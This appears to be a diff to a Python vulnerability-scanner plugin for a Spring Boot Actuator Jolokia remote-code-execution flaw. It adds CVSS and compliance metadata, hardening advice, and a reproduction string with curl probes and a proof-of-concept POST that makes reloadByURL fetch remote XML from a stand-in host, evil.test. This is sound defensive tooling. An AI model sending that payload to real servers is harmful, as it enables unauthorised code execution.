@@ -14,11 +14,41 @@ JOLOKIA_MARKER = 'spring-jolokia-rce-confirmed'
 
 class SpringJolokiaRcePlugin(PluginBase):
     name = 'Spring Boot Actuator Jolokia 远程代码执行'
-    cve = ''
+    cve = 'N/A'
     severity = 'high'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
     category = 'vuln'
     description = 'Jolokia JMX-HTTP 桥暴露 reloadByURL MBean，可加载远程 XML 配置触发 JNDI RCE'
     fix = '移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证'
+    fix_detail = (
+        '【移除依赖】pom.xml 删除 jolokia-core 依赖：\n'
+        '  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n'
+        '【配置加固】application.yml 禁用 jolokia 端点：\n'
+        '  management.endpoints.web.exposure.exclude: jolokia\n'
+        '  management.endpoint.jolokia.enabled: false\n'
+        '【SecurityConfig】为 jolokia 端点配置角色：\n'
+        '  .antMatchers("/actuator/jolokia/**").hasRole("ADMIN")\n'
+        '【JVM 加固】禁止 logback reloadByURL 加载远程配置：\n'
+        '  移除 ch.qos.logback.classic.jmx.JMXConfigurator MBean 注册\n'
+        '【WAF 规则】拦截外网对 /actuator/jolokia 的 POST，阻断 reloadByURL / JNDI 调用\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制'
+    )
+    reproduce = (
+        '# 1. 探测 Jolokia 端点可达性：\n'
+        'curl -i "http://target/actuator/jolokia"\n'
+        '\n'
+        '# 2. 列出已注册 MBean（探测 reloadByURL 是否存在）：\n'
+        'curl "http://target/actuator/jolokia/list" | python -m json.tool | grep -i "JMXConfigurator"\n'
+        '\n'
+        '# 3. reloadByURL 加载远程 logback XML 触发 JNDI RCE（PoC，请勿对未授权目标使用）：\n'
+        'curl -X POST "http://target/actuator/jolokia/" \\\n'
+        '  -H "Content-Type: application/json" \\\n'
+        '  -d \'{"type":"EXEC","mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator","operation":"reloadByURL","arguments":["http://evil.test/logback.xml"]}\'\n'
+        '\n'
+        '# 预期响应：list 返回 200 + MBean 域列表即漏洞存在'
+    )
 
     def verify(self, target, session):
         url = join_url(target, '/actuator/jolokia')
